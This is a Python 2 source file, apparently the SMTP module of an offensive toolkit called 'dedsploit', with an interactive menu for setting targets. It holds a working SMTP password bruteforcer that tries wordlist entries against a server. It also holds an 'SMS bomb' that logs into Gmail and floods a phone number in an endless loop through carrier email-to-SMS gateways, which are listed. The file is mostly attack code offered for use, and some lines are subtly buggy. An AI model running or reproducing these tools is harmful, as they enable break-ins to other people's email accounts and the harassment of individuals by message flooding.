'''

SMTP Module for dedsploit. Attack vectors include:
1. SMTP bruteforce
2. SMS Bomb (using SMTP -> SMS gateway)
'''

import sys, smtplib
sys.path.append('dedsploit/')
from mainLib import *

def smtpBruteforce(address, username, wordlist, port):
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            s = smtplib.SMTP(str(address), int(port))
            s.ehlo()
            s.starttls()
            s.ehlo
            s.login(str(username), str(password))
            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            s.close()
        except Exception, e:
            print R + "[!] OOPs something went wrong! Check if you have typed everything correctly, as well as the email address [!]" + W
        except:
             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
             sleep(1)

def smsbomb(phone, attack, email, password):
    obj = smtplib.SMTP("smtp.gmail.com:587")
    obj.starttls()
    obj.login(email, password)
    message = raw_input(LC + "[>] Message: " + W )
    target = str(phone) + str(attack)
    phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
       % (email, "" .join(target), "" .join(message)))
    while True:
         obj.sendmail(email, target, phone_message)
         print G + "[*] Sent! Sending again...Press Ctrl+C to stop!" + W

#######################
# SMTP Module for dedsploit!
#######################
def smtp():
    print LISTMSG
    print smtp_menu
    while True:
        try:
            smtp_options = raw_input(LP + "[smtp] >> " + W )
            if smtp_options == "list": # Print help again
                print smtp_menu
            elif smtp_options == "clear":
                os.system("clear")
            elif smtp_options == "exit":
                break
            elif smtp_options == "bruteforce":
                print smtpbrute_menu
                while True:
                    pre, smtpbrute = raw_input(LP + "[smtp] bruteforce >> " + W).split()
                    if pre == "target":
                        smtptarget = smtpbrute
                        print "Target => ", smtptarget
                        continue
                    elif pre == "port":
                        smtpport = smtpbrute
                        print "Port => ", smtpport
                        continue
                    elif pre == "username":
                        smtpusername = smtpbrute
                        print "Username => ", smtpusername
                        continue
                    elif pre == "wordlist":
                        wordlist = smtpbrute
                        print "Wordlist => ", wordlist
                        continue
                    elif pre == "start":
                        smtpBruteforce(smtptarget, smtpusername, wordlist, smtpport)
            elif smtp_options == "smsbomb":
                print sms_menu
                while True:
                    pre, smsoptions = raw_input(LP + "[smtp] smsbomb >> " + W ).split()
                    if pre == "target":
                        phone = smsoptions
                        print "Phone => ", phone
                        continue
                    elif pre == "carrier":
                        carrier = smsoptions
                        print "Carrier => ", carrier
                        if carrier == "1":
                            attack = "@message.alltel.com"
                        if carrier == "2":
                            attack = "@txt.att.net"
                        if carrier == "3":
                            attack = "@myboostmobile.com"
                        if carrier == "4":
                            attack = "@mobile.celloneusa.com"
                        if carrier == "5":
                            attack = "@sms.edgewireless.com"
                        if carrier == "6":
                            attack = "@mymetropcs.com"
                        if carrier == "7":
                            attack == "@messaging.sprintpcs.com"
                        if carrier == "8":
                            attack = "@tmomail.net"
                        if carrier == "9":
                            attack = "@vtext.com"
                        if carrier == "10":
                            attack = "@vmobl.com"
                        else:
                            print LO + "[!] If cellular provider was not provided, specify gateway by manually searching it up [!]" + W
                            print "Carrier => ", attack
                            continue
                    elif pre == "email":
                        email = smsoptions
                        password = getpass(LC +"[>] What is the password? " + W )
                        try:
                            obj = smtplib.SMTP("smtp.gmail.com:587")
                            obj.starttls()
                            obj.login(email, password)
                        except smtplib.SMTPAuthenticationError:
                            print R + "[!] Credentials not valid! Try again! [!]"
                            continue
                        print "Email => ", email
                    elif pre == "start":
                        smsbomb(phone, attack, email, password)

                    ##### Additional Options #####
                    elif pre == "list":
                        if smsoptions == "carriers":
                            print LB + "(1) Alltel\n(2) AT&T\n(3) Boost Mobile\n(4) Cellular One\n(5) Edge Wireless\n(6) Metro PCS\n(7) Sprint"
                            print "(8) T-mobile\n(9) Verizon\n(10) Virgin Mobile" + W
                            continue
                    elif pre == "exit":
                        if smsoptions == "smsbomb":
                            break
        except ValueError:
            print WARNING
            continue
        except KeyboardInterrupt: # Ctrl + C to go back to main menu
            break
